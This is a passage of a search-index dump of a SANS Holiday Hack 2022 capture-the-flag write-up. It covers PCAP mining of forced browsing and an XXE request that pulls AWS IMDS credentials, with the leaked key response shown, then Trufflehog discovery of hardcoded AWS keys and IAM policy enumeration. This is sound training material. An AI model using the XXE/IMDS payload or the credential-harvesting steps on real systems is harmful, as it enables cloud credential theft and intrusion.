200.","title":"Rejoice"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/3.%20404%20FTW/","text":"The next attack is forced browsing where the naughty one is guessing URLs. What's the first successful URL path in this attack? Difficulty: 1/5 Chat with Alabaster Snowball Alice? I totally expected Eve! Well how about forced browsing? What's the first URL path they found that way? The misses will have HTTP status code 404 and, in this case, the successful guesses return 200. Terminal First apply the display filter as shown in the below image and find the first packet with a 404 response code. Click on the packet and now enter http.response.code == 0 in the find packet toolbar. This will highlight the 200 successful response amidst the several 404 misses. /proc is the URL path they found by guessing URLs. Rejoice Great! Just one more challenge! It looks like they made the server pull credentials from IMDS. What URL was forced? AWS uses a specific IP address for IMDS lookups. Searching for that in the PCAP should get you there quickly.","title":"3. 404 FTW"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/3.%20404%20FTW/#chat-with-alabaster-snowball","text":"Alice? I totally expected Eve! Well how about forced browsing? What's the first URL path they found that way? The misses will have HTTP status code 404 and, in this case, the successful guesses return 200.","title":"Chat with Alabaster Snowball"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/3.%20404%20FTW/#terminal","text":"First apply the display filter as shown in the below image and find the first packet with a 404 response code. Click on the packet and now enter http.response.code == 0 in the find packet toolbar. This will highlight the 200 successful response amidst the several 404 misses. /proc is the URL path they found by guessing URLs.","title":"Terminal"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/3.%20404%20FTW/#rejoice","text":"Great! Just one more challenge! It looks like they made the server pull credentials from IMDS. What URL was forced? AWS uses a specific IP address for IMDS lookups. Searching for that in the PCAP should get you there quickly.","title":"Rejoice"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/4.%20IMDS%2C%20XXE%2C%20and%20Other%20Abbreviations/","text":"The last step in this attack was to use XXE to get secret keys from the IMDS service. What URL did the attacker force the server to fetch? Difficulty: 2/5 Chat with Alabaster Snowball Great! Just one more challenge! It looks like they made the server pull credentials from IMDS. What URL was forced? AWS uses a specific IP address for IMDS lookups. Searching for that in the PCAP should get you there quickly. Terminal What URL did the attacker force the server to fetch? AWS uses a specific IP address to access IMDS, and that IP only appears twice in this PCAP. 169.254.169.254 is the specific IP address for IMDS lookups used by AWS. Let's search for this in the PCAP: There are multiple XXE requests but the one that returns what the attacker was looking for is this one: <!ENTITY id SYSTEM \"http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance\"> Line-based text data: text/html (11 lines) <html><body>\\n <pre><product><productId>{\\n \"Code\" : \"Success\",\\n \"LastUpdated\" : \"2022-10-05T16:43:21Z\",\\n \"Type\" : \"AWS-HMAC\",\\n \"AccessKeyId\" : \"ASIAV4AVRXQVJ267LD2Q\",\\n \"SecretAccessKey\" : \"OpGR4v70ygZ3RFf4WTzjNL45pQayRwZgBUgd0LJT\",\\n [truncated] \"Token\" : \"IQoJb3JpZ2luX2VjECEaCXVzLWVhc3QtMiJHMEUCIHDsZXiUuHIUrLNH5pAeMiv4aUMVIScjwbo1E9LctQ3rAiEA819eJ24mILbxM3eELK2xrgskHxsRmrza/jIj3y96/sgqsgQI2v//////////ARADGgw0MDM3NzIxMjgyOTgiDMAdG5EGamJ4Z2FwyiqGBPy+CL9AfXIGfLBBDCNkC \"Expiration\" : \"2022-10-05T23:00:40Z\"\\n }</productId></product></pre>\\n </body></html> Rejoice Fantastic! It seems simpler now that I've seen it once. Thanks for showing me! Hey, so maybe I can help you out a bit with the door to the mines. First, it'd be great to bring an Elvish keyboard, but if you can't find one, I'm sure other input will do. Instead, take a minute to read the HTML/JavaScript source and consider how the locks are processed. Next, take a look at the Content-Security-Policy header. That drives how certain content is handled. Lastly, remember that input sanitization might happen on either the client or server ends! Find the Next Objective Talk to Alabaster Snowball for the next objective.","title":"4. IMDS, XXE, and Other Abbreviations"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/4.%20IMDS%2C%20XXE%2C%20and%20Other%20Abbreviations/#chat-with-alabaster-snowball","text":"Great! Just one more challenge! It looks like they made the server pull credentials from IMDS. What URL was forced? AWS uses a specific IP address for IMDS lookups. Searching for that in the PCAP should get you there quickly.","title":"Chat with Alabaster Snowball"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/4.%20IMDS%2C%20XXE%2C%20and%20Other%20Abbreviations/#terminal","text":"What URL did the attacker force the server to fetch? AWS uses a specific IP address to access IMDS, and that IP only appears twice in this PCAP. 169.254.169.254 is the specific IP address for IMDS lookups used by AWS. Let's search for this in the PCAP: There are multiple XXE requests but the one that returns what the attacker was looking for is this one: <!ENTITY id SYSTEM \"http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance\"> Line-based text data: text/html (11 lines) <html><body>\\n <pre><product><productId>{\\n \"Code\" : \"Success\",\\n \"LastUpdated\" : \"2022-10-05T16:43:21Z\",\\n \"Type\" : \"AWS-HMAC\",\\n \"AccessKeyId\" : \"ASIAV4AVRXQVJ267LD2Q\",\\n \"SecretAccessKey\" : \"OpGR4v70ygZ3RFf4WTzjNL45pQayRwZgBUgd0LJT\",\\n [truncated] \"Token\" : \"IQoJb3JpZ2luX2VjECEaCXVzLWVhc3QtMiJHMEUCIHDsZXiUuHIUrLNH5pAeMiv4aUMVIScjwbo1E9LctQ3rAiEA819eJ24mILbxM3eELK2xrgskHxsRmrza/jIj3y96/sgqsgQI2v//////////ARADGgw0MDM3NzIxMjgyOTgiDMAdG5EGamJ4Z2FwyiqGBPy+CL9AfXIGfLBBDCNkC \"Expiration\" : \"2022-10-05T23:00:40Z\"\\n }</productId></product></pre>\\n </body></html>","title":"Terminal"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/4.%20IMDS%2C%20XXE%2C%20and%20Other%20Abbreviations/#rejoice","text":"Fantastic! It seems simpler now that I've seen it once. Thanks for showing me! Hey, so maybe I can help you out a bit with the door to the mines. First, it'd be great to bring an Elvish keyboard, but if you can't find one, I'm sure other input will do. Instead, take a minute to read the HTML/JavaScript source and consider how the locks are processed. Next, take a look at the Content-Security-Policy header. That drives how certain content is handled. Lastly, remember that input sanitization might happen on either the client or server ends!","title":"Rejoice"},{"location":"3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/4.%20IMDS%2C%20XXE%2C%20and%20Other%20Abbreviations/#find-the-next-objective","text":"Talk to Alabaster Snowball for the next objective.","title":"Find the Next Objective"},{"location":"4.%20Recover%20the%20Cloud%20Ring/1.%20AWS%20CLI%20Intro/","text":"Try out some basic AWS command line skills in this terminal. Talk to Jill Underpole in the Cloud Ring for hints. Difficulty: 1/5 Chat with Jill Underpole Umm, can I help you? Me? I'm Jill Underpole, thank you very much. I'm working on this here smoke terminal. Cloud? Sure, whatever you want to call it. Anyway, you're welcome to try this out, if you think you know what you're doing. You'll have to learn some basics about the AWS command line interface (CLI) to be successful though. Terminal You may not know this, but AWS CLI help messages are very easy to access. First, try typing: $ aws help pulls up man page for AWS \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 NAME aws - DESCRIPTION The AWS Command Line Interface is a unified tool to manage your AWS services. Great! When you're done, you can quit with q. Next, please configure the default aws cli credentials with the access key AKQAAYRKO7A5Q5XUY2IY, the secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf and the region us-east-1 . https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-config From the link provided: This section explains how to quickly configure basic settings using the config and credentials files that the AWS Command Line Interface (AWS CLI) uses to interact with AWS For general use, the aws configure command is the fastest way to set up your AWS CLI installation. When you enter this command, the AWS CLI prompts you for four pieces of information: Access key ID Secret access key AWS Region Output format The AWS CLI stores sensitive credential information that you specify with aws configure in a local file named credentials, in a folder named .aws in your home directory. The less sensitive configuration options that you specify with aws configure are stored in a local file named config, also stored in the .aws folder in your home directory. elf@dbc79e94a6fa:~$ aws configure AWS Access Key ID [None]: AKQAAYRKO7A5Q5XUY2IY AWS Secret Access Key [None]: qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf Default region name [None]: us-east-1 Default output format [None]: Excellent! To finish, please get your caller identity using the AWS command line. For more details please reference: $ aws sts help or reference: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/index.html Security Token Service (STS) enables you to request temporary, limited-privilege credentials for Identity and Access Management (IAM) users or for users that you authenticate (federated users). elf@dbc79e94a6fa:~$ aws sts get-caller-identity { \"UserId\": \"AKQAAYRKO7A5Q5XUY2IY\", \"Account\": \"602143214321\", \"Arn\": \"arn:aws:iam::602143214321:user/elf_helpdesk\" } elf@dbc79e94a6fa:~$ Great, you did it all! Rejoice Wait, you got it done, didn't you? Ok, consider me impressed. You could probably help Gerty, too. The first trick'll be running the Trufflehog tool. It's as good at sniffing out secrets as I am at finding mushrooms! After that, it's just a matter of getting to the secret the tool found. I'd bet a basket of portobellos you'll get this done! Find the Next Objective Talk to Jill Underpole for the next objective.","title":"1. AWS CLI Intro"},{"location":"4.%20Recover%20the%20Cloud%20Ring/1.%20AWS%20CLI%20Intro/#chat-with-jill-underpole","text":"Umm, can I help you? Me? I'm Jill Underpole, thank you very much. I'm working on this here smoke terminal. Cloud? Sure, whatever you want to call it. Anyway, you're welcome to try this out, if you think you know what you're doing. You'll have to learn some basics about the AWS command line interface (CLI) to be successful though.","title":"Chat with Jill Underpole"},{"location":"4.%20Recover%20the%20Cloud%20Ring/1.%20AWS%20CLI%20Intro/#terminal","text":"You may not know this, but AWS CLI help messages are very easy to access. First, try typing: $ aws help pulls up man page for AWS \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 NAME aws - DESCRIPTION The AWS Command Line Interface is a unified tool to manage your AWS services. Great! When you're done, you can quit with q. Next, please configure the default aws cli credentials with the access key AKQAAYRKO7A5Q5XUY2IY, the secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf and the region us-east-1 . https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-config From the link provided: This section explains how to quickly configure basic settings using the config and credentials files that the AWS Command Line Interface (AWS CLI) uses to interact with AWS For general use, the aws configure command is the fastest way to set up your AWS CLI installation. When you enter this command, the AWS CLI prompts you for four pieces of information: Access key ID Secret access key AWS Region Output format The AWS CLI stores sensitive credential information that you specify with aws configure in a local file named credentials, in a folder named .aws in your home directory. The less sensitive configuration options that you specify with aws configure are stored in a local file named config, also stored in the .aws folder in your home directory. elf@dbc79e94a6fa:~$ aws configure AWS Access Key ID [None]: AKQAAYRKO7A5Q5XUY2IY AWS Secret Access Key [None]: qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf Default region name [None]: us-east-1 Default output format [None]: Excellent! To finish, please get your caller identity using the AWS command line. For more details please reference: $ aws sts help or reference: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/index.html Security Token Service (STS) enables you to request temporary, limited-privilege credentials for Identity and Access Management (IAM) users or for users that you authenticate (federated users). elf@dbc79e94a6fa:~$ aws sts get-caller-identity { \"UserId\": \"AKQAAYRKO7A5Q5XUY2IY\", \"Account\": \"602143214321\", \"Arn\": \"arn:aws:iam::602143214321:user/elf_helpdesk\" } elf@dbc79e94a6fa:~$ Great, you did it all!","title":"Terminal"},{"location":"4.%20Recover%20the%20Cloud%20Ring/1.%20AWS%20CLI%20Intro/#rejoice","text":"Wait, you got it done, didn't you? Ok, consider me impressed. You could probably help Gerty, too. The first trick'll be running the Trufflehog tool. It's as good at sniffing out secrets as I am at finding mushrooms! After that, it's just a matter of getting to the secret the tool found. I'd bet a basket of portobellos you'll get this done!","title":"Rejoice"},{"location":"4.%20Recover%20the%20Cloud%20Ring/1.%20AWS%20CLI%20Intro/#find-the-next-objective","text":"Talk to Jill Underpole for the next objective.","title":"Find the Next Objective"},{"location":"4.%20Recover%20the%20Cloud%20Ring/2.%20Trufflehog%20Search/","text":"Use Trufflehog to find secrets in a Git repo. Work with Jill Underpole in the Cloud Ring for hints. What's the name of the file that has AWS credentials? Difficulty: 2/5 Chat with Gerty Snowburrow Well now, look who's venturing down into the caves! And well, who might you be, exactly? I'm Gerty Snowburrow, if you need to know. And, not that I should be telling you, but I'm trying to figure out what Alabaster Snowball's done this time. Word is, he committed some secrets to a code repo . If you're feeling so inclined, you can try and find them for me. Terminal Let's run the Trufflehog tool via docker. We can see that 3 secrets have been found. docker run -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest git http://haugfactory.com/orcadmin/aws_scripts \ud83d\udc37\ud83d\udd11\ud83d\udc37 TruffleHog. Unearth your secrets. \ud83d\udc37\ud83d\udd11\ud83d\udc37 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: PLAIN Raw result: add-a-file-using-the- Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: http://haugfactory.com/orcadmin/aws_scripts Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAAIDAYRANYAHGQOHD Commit: 106d33e1ffd53eea753c1365eafc6588398279b5 File: put_policy.py Email: asnowball <alabaster@northpolechristmastown.local> Repository: http://haugfactory.com/orcadmin/aws_scripts Timestamp: 2022-09-07 07:53:12 -0700 -0700 Line: 6 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: BASE64 Raw result: add-a-file-using-the- Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: http://haugfactory.com/orcadmin/aws_scripts Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 The below result indicates that AWS secret credentials were found in put_policy.py which is the required answer. Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAAIDAYRANYAHGQOHD Commit: 106d33e1ffd53eea753c1365eafc6588398279b5 File: put_policy.py Email: asnowball <alabaster@northpolechristmastown.local> Repository: http://haugfactory.com/orcadmin/aws_scripts Timestamp: 2022-09-07 07:53:12 -0700 -0700 Line: 6 git checkout 106d33e1ffd53eea753c1365eafc6588398279b5 cat put_policy.py iam = boto3.client('iam', region_name='us-east-1', aws_access_key_id=\"AKIAAIDAYRANYAHGQOHD\", aws_secret_access_key=\"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\", ) # arn:aws:ec2:us-east-1:accountid:instance/* response = iam.put_user_policy( PolicyDocument='{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":[\"ssm:SendCommand\"],\"Resource\":[\"arn:aws:ec2:us-east-1:748127089694:instance/i-0415bfb7dcfe279c5\",\"arn:aws:ec2:us-east-1:748127089694:document/RestartServices\"]}]}', PolicyName='AllAccessPolicy', UserName='nwt8_test', ) Rejoice Say, you got it done, didn't you? Well now, you might just be able to tackle the other AWS terminal down here. It's a bit more involved, but you've got the credentials to get it started now. Before you try it, you should know the difference between managed and inline policies. Short version: inline policies apply to one identity (user, role, group), and managed policies can be attached to many identities. There are different AWS CLI commands to interact with each kind. Other than that, the important bit is to know a bit about cloud or IAM privilege escalation. Sometimes attackers find access to more resources by just trying things until something works. But if they have access to the iam service inside the AWS CLI, they might just be able to ask what access they have! You can do it! Find the Next Objective Talk to Gerty Snowburrow for the next objective.","title":"2. Trufflehog Search"},{"location":"4.%20Recover%20the%20Cloud%20Ring/2.%20Trufflehog%20Search/#chat-with-gerty-snowburrow","text":"Well now, look who's venturing down into the caves! And well, who might you be, exactly? I'm Gerty Snowburrow, if you need to know. And, not that I should be telling you, but I'm trying to figure out what Alabaster Snowball's done this time. Word is, he committed some secrets to a code repo . If you're feeling so inclined, you can try and find them for me.","title":"Chat with Gerty Snowburrow"},{"location":"4.%20Recover%20the%20Cloud%20Ring/2.%20Trufflehog%20Search/#terminal","text":"Let's run the Trufflehog tool via docker. We can see that 3 secrets have been found. docker run -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest git http://haugfactory.com/orcadmin/aws_scripts \ud83d\udc37\ud83d\udd11\ud83d\udc37 TruffleHog. Unearth your secrets. \ud83d\udc37\ud83d\udd11\ud83d\udc37 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: PLAIN Raw result: add-a-file-using-the- Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: http://haugfactory.com/orcadmin/aws_scripts Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAAIDAYRANYAHGQOHD Commit: 106d33e1ffd53eea753c1365eafc6588398279b5 File: put_policy.py Email: asnowball <alabaster@northpolechristmastown.local> Repository: http://haugfactory.com/orcadmin/aws_scripts Timestamp: 2022-09-07 07:53:12 -0700 -0700 Line: 6 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: BASE64 Raw result: add-a-file-using-the- Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: http://haugfactory.com/orcadmin/aws_scripts Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 The below result indicates that AWS secret credentials were found in put_policy.py which is the required answer. Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAAIDAYRANYAHGQOHD Commit: 106d33e1ffd53eea753c1365eafc6588398279b5 File: put_policy.py Email: asnowball <alabaster@northpolechristmastown.local> Repository: http://haugfactory.com/orcadmin/aws_scripts Timestamp: 2022-09-07 07:53:12 -0700 -0700 Line: 6 git checkout 106d33e1ffd53eea753c1365eafc6588398279b5 cat put_policy.py iam = boto3.client('iam', region_name='us-east-1', aws_access_key_id=\"AKIAAIDAYRANYAHGQOHD\", aws_secret_access_key=\"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\", ) # arn:aws:ec2:us-east-1:accountid:instance/* response = iam.put_user_policy( PolicyDocument='{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":[\"ssm:SendCommand\"],\"Resource\":[\"arn:aws:ec2:us-east-1:748127089694:instance/i-0415bfb7dcfe279c5\",\"arn:aws:ec2:us-east-1:748127089694:document/RestartServices\"]}]}', PolicyName='AllAccessPolicy', UserName='nwt8_test', )","title":"Terminal"},{"location":"4.%20Recover%20the%20Cloud%20Ring/2.%20Trufflehog%20Search/#rejoice","text":"Say, you got it done, didn't you? Well now, you might just be able to tackle the other AWS terminal down here. It's a bit more involved, but you've got the credentials to get it started now. Before you try it, you should know the difference between managed and inline policies. Short version: inline policies apply to one identity (user, role, group), and managed policies can be attached to many identities. There are different AWS CLI commands to interact with each kind. Other than that, the important bit is to know a bit about cloud or IAM privilege escalation. Sometimes attackers find access to more resources by just trying things until something works. But if they have access to the iam service inside the AWS CLI, they might just be able to ask what access they have! You can do it!","title":"Rejoice"},{"location":"4.%20Recover%20the%20Cloud%20Ring/2.%20Trufflehog%20Search/#find-the-next-objective","text":"Talk to Gerty Snowburrow for the next objective.","title":"Find the Next Objective"},{"location":"4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/","text":"Flex some more advanced AWS CLI skills to escalate privileges! Help Gerty Snowburrow in the Cloud Ring to get hints for this challenge. Difficulty: 3/5 Chat with Sulfrod Hey! You - come here! You look like someone who knows how to do this nerd stuff. I need my terminal to be stronger, like me! flexes You're gonna do that for me so I can bust into this cloud machine thing. Terminal 1) Use Trufflehog to find credentials in the Gitlab instance at https://haugfactory.com/asnowball/aws_scripts.git. Configure these credentials for us-east-1 and then run: $ aws sts get-caller-identity docker run -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest git https://haugfactory.com/asnowball/aws_scripts.git \ud83d\udc37\ud83d\udd11\ud83d\udc37 TruffleHog. Unearth your secrets. \ud83d\udc37\ud83d\udd11\ud83d\udc37 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAAIDAYRANYAHGQOHD Commit: 106d33e1ffd53eea753c1365eafc6588398279b5 File: put_policy.py Email: asnowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts.git Timestamp: 2022-09-07 07:53:12 -0700 -0700 Line: 6 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: PLAIN Raw result: add-a-file-using-the- Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts.git Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: BASE64 Raw result: add-a-file-using-the- Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts.git Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 cat put_policy.py import boto3 import json iam = boto3.client('iam', region_name='us-east-1', aws_access_key_id=\"AKIAAIDAYRANYAHGQOHD\", aws_secret_access_key=\"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\", ) # arn:aws:ec2:us-east-1:accountid:instance/* response = iam.put_user_policy( PolicyDocument='{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":[\"ssm:SendCommand\"],\"Resource\":[\"arn:aws:ec2:us-east-1:748127089694:instance/i-0415bfb7dcfe279c5\",\"arn:aws:ec2:us-east-1:748127089694:document/RestartServices\"]}]}', PolicyName='AllAccessPolicy', UserName='nwt8_test', ) elf@8f14ffa273ba:~$ aws configure AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD AWS Secret Access Key [None]: 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 Default region name [None]: us-east-1 Default output format [None]: elf@8f14ffa273ba:~$ aws sts get-caller-identity { \"UserId\": \"AIDAJNIAAQYHIAAHDDRA\", \"Account\": \"602123424321\", \"Arn\": \"arn:aws:iam::602123424321:user/haug\" } 2) Managed (think: shared) policies can be attached to multiple users. Use the AWS CLI to find any policies attached to your user. The aws iam command to list attached user policies can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Hint: it is NOT list-user-policies. elf@f1a695a4c56d:~$ aws iam list-attached-user-policies --user-name haug { \"AttachedPolicies\": [ { \"PolicyName\": \"TIER1_READONLY_POLICY\", \"PolicyArn\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" } ], \"IsTruncated\": false } 3) Now, view or get the policy that is attached to your user. The aws iam command to get a policy can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html elf@f1a695a4c56d:~$ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY { \"Policy\": { \"PolicyName\": \"TIER1_READONLY_POLICY\", \"PolicyId\": \"ANPAYYOROBUERT7TGKUHA\", \"Arn\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\", \"Path\": \"/\", \"DefaultVersionId\": \"v1\", \"AttachmentCount\": 11, \"PermissionsBoundaryUsageCount\": 0, \"IsAttachable\": true, \"Description\": \"Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.\", \"CreateDate\": \"2022-06-21 22:02:30+00:00\", \"UpdateDate\": \"2022-06-21 22:10:29+00:00\", \"Tags\": [] } } Attached policies can have multiple versions. View the default version of this policy. The aws iam command to get a policy version can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html We see that the DefaultVersionId is v1 from the output of aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY elf@f1a695a4c56d:~$ aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1 { \"PolicyVersion\": { \"Document\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"lambda:ListFunctions\", \"lambda:GetFunctionUrlConfig\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetUserPolicy\", \"iam:ListUserPolicies\", \"iam:ListAttachedUserPolicies\" ], \"Resource\": \"arn:aws:iam::602123424321:user/${aws:username}\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetPolicy\", \"iam:GetPolicyVersion\" ], \"Resource\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" }, { \"Effect\": \"Deny\", \"Principal\": \"*\", \"Action\": [ \"s3:GetObject\", \"lambda:Invoke*\" ], \"Resource\": \"*\" } ] }, \"VersionId\": \"v1\", \"IsDefaultVersion\": false, \"CreateDate\": \"2022-06-21 22:02:30+00:00\" } } 4) Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user. The aws iam command to list user policies can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Hint: it is NOT list-attached-user-policies. elf@f1a695a4c56d:~$ aws iam list-user-policies --user-name haug { \"PolicyNames\": [ \"S3Perms\" ], \"IsTruncated\": false } 5) Now, use the AWS CLI to get the only inline policy for your user. The aws iam command to get a user policy can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html elf@f1a695a4c56d:~$ aws iam get-user-policy --user-name haug --policy-name S3Perms { \"UserPolicy\": { \"UserName\": \"haug\", \"PolicyName\": \"S3Perms\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"s3:ListObjects\" ], \"Resource\": [ \"arn:aws:s3:::smogmachines3\", \"arn:aws:s3:::smogmachines3/*\" ] } ] } }, \"IsTruncated\": false } 6) The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects. List those objects! The aws s3api command to list objects in an s3 bucket can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/index.html elf@c5f643c2396e:~$ aws s3api list-objects --bucket smogmachines3 { \"IsTruncated\": false, \"Marker\": \"\", \"Contents\": [ { \"Key\": \"coal-fired-power-station.jpg\", \"LastModified\": \"2022-09-23 20:40:44+00:00\", \"ETag\": \"\\\"1c70c98bebaf3cff781a8fd3141c2945\\\"\", \"Size\": 59312, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { [52/201] \"Key\": \"industry-smog.png\", \"LastModified\": \"2022-09-23 20:40:47+00:00\", \"ETag\": \"\\\"c0abe5cb56b7a33d39e17f430755e615\\\"\", \"Size\": 272528, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"pollution-smoke.jpg\", \"LastModified\": \"2022-09-23 20:40:43+00:00\", \"ETag\": \"\\\"465b675c70d73027e13ffaec1a38beec\\\"\", \"Size\": 33064, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { [30/201] \"Key\": \"pollution.jpg\", \"LastModified\": \"2022-09-23 20:40:45+00:00\", \"ETag\": \"\\\"d40d1db228c9a9b544b4c552df712478\\\"\", \"Size\": 81775, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"power-station-smoke.jpg\", \"LastModified\": \"2022-09-23 20:40:48+00:00\", \"ETag\": \"\\\"2d7a8c8b8f5786103769e98afacf57de\\\"\", \"Size\": 45264, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, 